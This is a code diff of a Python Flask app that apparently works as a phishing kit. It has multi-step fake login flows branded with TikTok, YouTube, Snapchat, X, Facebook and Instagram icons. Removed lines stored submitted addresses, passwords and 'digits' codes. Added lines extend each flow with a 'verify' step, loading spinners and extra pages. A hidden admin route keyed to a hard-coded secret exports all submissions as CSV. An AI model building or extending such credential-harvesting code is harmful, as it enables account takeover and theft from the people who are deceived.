@@ -11,19 +11,34 @@ ADMIN_SECRET = "supersecret-admin-2025"
 ICON_MAP = {
     "joy1_1": ("fa-brands fa-tiktok", "#000000"),
     "joy1_2": ("fa-brands fa-tiktok", "#000000"),
+    "joy1_3": ("fa-brands fa-tiktok", "#000000"),
+
     "joy2_1": ("fa-brands fa-youtube", "#FF0000"),
     "joy2_2": ("fa-brands fa-youtube", "#FF0000"),
+    "joy2_3": ("fa-brands fa-youtube", "#FF0000"),
+
     "happy1_1": ("fa-brands fa-snapchat", "#FFFC00"),
     "happy1_2": ("fa-brands fa-snapchat", "#FFFC00"),
+    "happy1_3": ("fa-brands fa-snapchat", "#FFFC00"),
+
     "happy2_1": ("fa-brands fa-x-twitter", "#000000"),
     "happy2_2": ("fa-brands fa-x-twitter", "#000000"),
+    "happy2_3": ("fa-brands fa-x-twitter", "#000000"),
+
     "love1_1": ("fa-brands fa-facebook-f", "#1877F2"),
     "love1_2": ("fa-brands fa-facebook-f", "#1877F2"),
+    "love1_3": ("fa-brands fa-facebook-f", "#1877F2"),
+
     "love2_1": ("fa-brands fa-instagram", "#E1306C"),
     "love2_2": ("fa-brands fa-instagram", "#E1306C"),
+    "love2_3": ("fa-brands fa-instagram", "#E1306C"),
+
     "f1": ("fa-solid fa-file", "#666"),
+    "f1_A": ("fa-solid fa-file", "#666"),
     "f2": ("fa-solid fa-file", "#666"),
-    "m1": ("fa-solid fa-circle-check", "#10B981")
+    "f2_A": ("fa-solid fa-file", "#666"),
+
+    "m1": ("fa-solid fa-circle-check", "#10B981"),
 }
 
 def init_db():
@@ -46,8 +61,10 @@ init_db()
 def save_submission(page, user, data):
     icon = ICON_MAP.get(page, ("fa-solid fa-file", "#333"))[0]
     with sqlite3.connect(DB_FILE) as conn:
-        conn.execute("INSERT INTO submissions (timestamp, page, user, data, icon) VALUES (?,?,?,?,?)",
-                     (datetime.utcnow().isoformat(), page, user, data, icon))
+        conn.execute(
+            "INSERT INTO submissions (timestamp, page, user, data, icon) VALUES (?,?,?,?,?)",
+            (datetime.utcnow().isoformat(), page, user, data, icon)
+        )
         conn.commit()
 
 def extract_user(form):
@@ -57,18 +74,19 @@ def extract_user(form):
             return val.strip()
     return "anonymous"
 
+
 @app.route('/')
 def index():
     return render_template('index.html')
 
-# Generic route pattern implemented explicitly for each flow per spec
+# ---------------------------
+#       JOY1 FLOW
+# ---------------------------
 @app.route('/joy1_1', methods=['GET','POST'])
 def joy1_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        addr = request.form.get('address','')
-        pwd = request.form.get('password','')
-        save_submission('joy1_1', user, f'address={addr}; password={pwd}')
+        save_submission('joy1_1', user, f"login")
         return redirect(url_for('joy1_2'))
     return render_template('joy1_1.html')
 
@@ -76,18 +94,26 @@ def joy1_1():
 def joy1_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('joy1_2', user, f'digits={digits}')
-        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
+        save_submission('joy1_2', user, f"digits")
+        return redirect(url_for('joy1_3'))
     return render_template('joy1_2.html')
 
+@app.route('/joy1_3', methods=['GET','POST'])
+def joy1_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        save_submission('joy1_3', user, "verify")
+        return redirect(url_for('spinner'))
+    return render_template('joy1_3.html')
+
+# ---------------------------
+#       JOY2 FLOW
+# ---------------------------
 @app.route('/joy2_1', methods=['GET','POST'])
 def joy2_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        addr = request.form.get('address','')
-        pwd = request.form.get('password','')
-        save_submission('joy2_1', user, f'address={addr}; password={pwd}')
+        save_submission('joy2_1', user, f"login")
         return redirect(url_for('joy2_2'))
     return render_template('joy2_1.html')
 
@@ -95,18 +121,27 @@ def joy2_1():
 def joy2_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('joy2_2', user, f'digits={digits}')
-        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
+        save_submission('joy2_2', user, f"digits")
+        return redirect(url_for('joy2_3'))
     return render_template('joy2_2.html')
 
+@app.route('/joy2_3', methods=['GET','POST'])
+def joy2_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        save_submission('joy2_3', user, f"verify")
+        return redirect(url_for('spinner'))
+    return render_template('joy2_3.html')
+
+
+# ---------------------------
+#      HAPPY1 FLOW
+# ---------------------------
 @app.route('/happy1_1', methods=['GET','POST'])
 def happy1_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        addr = request.form.get('address','')
-        pwd = request.form.get('password','')
-        save_submission('happy1_1', user, f'address={addr}; password={pwd}')
+        save_submission('happy1_1', user, "login")
         return redirect(url_for('happy1_2'))
     return render_template('happy1_1.html')
 
@@ -114,18 +149,27 @@ def happy1_1():
 def happy1_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('happy1_2', user, f'digits={digits}')
-        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
+        save_submission('happy1_2', user, "digits")
+        return redirect(url_for('happy1_3'))
     return render_template('happy1_2.html')
 
+@app.route('/happy1_3', methods=['GET','POST'])
+def happy1_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        save_submission('happy1_3', user, "verify")
+        return redirect(url_for('spinner'))
+    return render_template('happy1_3.html')
+
+
+# ---------------------------
+#      HAPPY2 FLOW
+# ---------------------------
 @app.route('/happy2_1', methods=['GET','POST'])
 def happy2_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        addr = request.form.get('address','')
-        pwd = request.form.get('password','')
-        save_submission('happy2_1', user, f'address={addr}; password={pwd}')
+        save_submission('happy2_1', user, "login")
         return redirect(url_for('happy2_2'))
     return render_template('happy2_1.html')
 
@@ -133,18 +177,27 @@ def happy2_1():
 def happy2_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('happy2_2', user, f'digits={digits}')
-        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
+        save_submission('happy2_2', user, "digits")
+        return redirect(url_for('happy2_3'))
     return render_template('happy2_2.html')
 
+@app.route('/happy2_3', methods=['GET','POST'])
+def happy2_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        save_submission('happy2_3', user, "verify")
+        return redirect(url_for('spinner'))
+    return render_template('happy2_3.html')
+
+
+# ---------------------------
+#      LOVE1 FLOW
+# ---------------------------
 @app.route('/love1_1', methods=['GET','POST'])
 def love1_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        addr = request.form.get('address','')
-        pwd = request.form.get('password','')
-        save_submission('love1_1', user, f'address={addr}; password={pwd}')
+        save_submission('love1_1', user, "login")
         return redirect(url_for('love1_2'))
     return render_template('love1_1.html')
 
@@ -152,18 +205,27 @@ def love1_1():
 def love1_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('love1_2', user, f'digits={digits}')
-        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
+        save_submission('love1_2', user, "digits")
+        return redirect(url_for('love1_3'))
     return render_template('love1_2.html')
 
+@app.route('/love1_3', methods=['GET','POST'])
+def love1_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        save_submission('love1_3', user, "verify")
+        return redirect(url_for('spinner'))
+    return render_template('love1_3.html')
+
+
+# ---------------------------
+#      LOVE2 FLOW
+# ---------------------------
 @app.route('/love2_1', methods=['GET','POST'])
 def love2_1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        addr = request.form.get('address','')
-        pwd = request.form.get('password','')
-        save_submission('love2_1', user, f'address={addr}; password={pwd}')
+        save_submission('love2_1', user, "login")
         return redirect(url_for('love2_2'))
     return render_template('love2_1.html')
 
@@ -171,33 +233,80 @@ def love2_1():
 def love2_2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('love2_2', user, f'digits={digits}')
-        return render_template('spinner.html', next_url=url_for('f1'), delay=4)
+        save_submission('love2_2', user, "digits")
+        return redirect(url_for('love2_3'))
     return render_template('love2_2.html')
+
+@app.route('/love2_3', methods=['GET','POST'])
+def love2_3():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        save_submission('love2_3', user, "verify")
+        return redirect(url_for('spinner'))
+    return render_template('love2_3.html')
+
+# ---------------------------
+#       SPINNER ROUTES
+# ---------------------------
+
+@app.route('/spinner')
+def spinner():
+    return render_template('spinner.html')
+
+@app.route('/spinner2')
+def spinner2():
+    return render_template('spinner2.html')
+
+
+# ---------------------------
+#       F1 & F2 FLOW
+# ---------------------------
 
 @app.route('/f1', methods=['GET','POST'])
 def f1():
     if request.method == 'POST':
         user = extract_user(request.form)
-        items = [f"{k}: {v}" for k,v in request.form.items()]
-        save_submission('f1', user, " ; ".join(items))
-        return redirect(url_for('f2'))
+        save_submission('f1', user, "submitted")
+        return redirect(url_for('f1_A'))
     return render_template('f1.html')
+
+@app.route('/f1_A', methods=['GET','POST'])
+def f1_A():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        save_submission('f1_A', user, "submitted")
+        return redirect(url_for('spinner2'))
+    return render_template('f1_A.html')
 
 @app.route('/f2', methods=['GET','POST'])
 def f2():
     if request.method == 'POST':
         user = extract_user(request.form)
-        addr = request.form.get('address','')
-        pwd = request.form.get('password','')
-        save_submission('f2', user, f'address={addr}; password={pwd}')
-        return redirect(url_for('m1'))
+        save_submission('f2', user, "submitted")
+        return redirect(url_for('f2_A'))
     return render_template('f2.html')
+
+@app.route('/f2_A', methods=['GET','POST'])
+def f2_A():
+    if request.method == 'POST':
+        user = extract_user(request.form)
+        save_submission('f2_A', user, "submitted")
+        return redirect(url_for('m1'))
+    return render_template('f2_A.html')
+
+
+# ---------------------------
+#       FINAL PAGE
+# ---------------------------
 
 @app.route('/m1')
 def m1():
     return render_template('m1.html')
+
+
+# ---------------------------
+#       ADMIN SECTION
+# ---------------------------
 
 @app.route(f"/admin/{ADMIN_SECRET}")
 def admin():
@@ -231,6 +340,7 @@ def download():
         writer.writerow(['id','timestamp','page','user','data'])
         writer.writerows(rows)
     return send_file(csv_path, as_attachment=True)
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT',5000)), debug=True)
